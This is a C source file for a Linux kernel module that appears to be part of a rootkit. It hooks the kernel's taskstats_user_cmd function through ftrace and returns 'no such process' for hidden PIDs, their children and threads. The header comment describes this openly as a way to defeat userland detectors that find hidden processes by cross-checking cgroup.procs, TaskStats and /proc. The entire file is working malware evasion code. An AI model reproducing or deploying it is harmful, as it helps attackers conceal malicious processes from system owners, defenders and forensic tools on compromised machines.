/*
 * TaskStats Netlink Hook (Anti-Detection)
 *
 * Certain userland detectors leverage TaskStats (TASKSTATS netlink)
 * to uncover hidden processes.
 *
 * The detection logic is simple: if a PID is present in cgroup.procs
 * and TaskStats successfully returns statistics for it, but
 * /proc/<pid> is missing, the process is classified as hidden.
 *
 * So for bypass this, we need to hook the taskstats_user_cmd and deliberately 
 * fail requests targeting concealed PIDs, preventing userland tools
 * from correlating TaskStats output with non-existent /proc entries.
 */

#include "../include/core.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/hidden_pids.h"
#include "../include/task.h"

static int (*orig_taskstats_user_cmd)(struct sk_buff *skb, struct genl_info *info);

static notrace bool is_pid_hidden_ts(pid_t pid)
{
    if (pid <= 0)
        return false;

    return is_hidden_pid(pid) || is_child_pid(pid) || pid_is_thread(pid);
}

static notrace int hook_taskstats_user_cmd(struct sk_buff *skb, struct genl_info *info)
{
    pid_t pid = 0;
    
    if (!orig_taskstats_user_cmd)
        return -EINVAL;
    
    if (!info)
        return orig_taskstats_user_cmd(skb, info);
    
    if (info->attrs) {
        if (info->attrs[TASKSTATS_CMD_ATTR_PID]) {
            pid = nla_get_u32(info->attrs[TASKSTATS_CMD_ATTR_PID]);
        }
        else if (info->attrs[TASKSTATS_CMD_ATTR_TGID]) {
            pid = nla_get_u32(info->attrs[TASKSTATS_CMD_ATTR_TGID]);
        }
    }
    
    if (pid > 0 && is_pid_hidden_ts(pid)) {
        return -ESRCH;
    }
    
    return orig_taskstats_user_cmd(skb, info);
}

static struct ftrace_hook taskstats_hooks[] = {
    HOOK("taskstats_user_cmd", hook_taskstats_user_cmd, &orig_taskstats_user_cmd),
};

notrace int taskstats_hook_init(void)
{
    return fh_install_hooks(taskstats_hooks, ARRAY_SIZE(taskstats_hooks));
}

notrace void taskstats_hook_exit(void)
{
    fh_remove_hooks(taskstats_hooks, ARRAY_SIZE(taskstats_hooks));
}
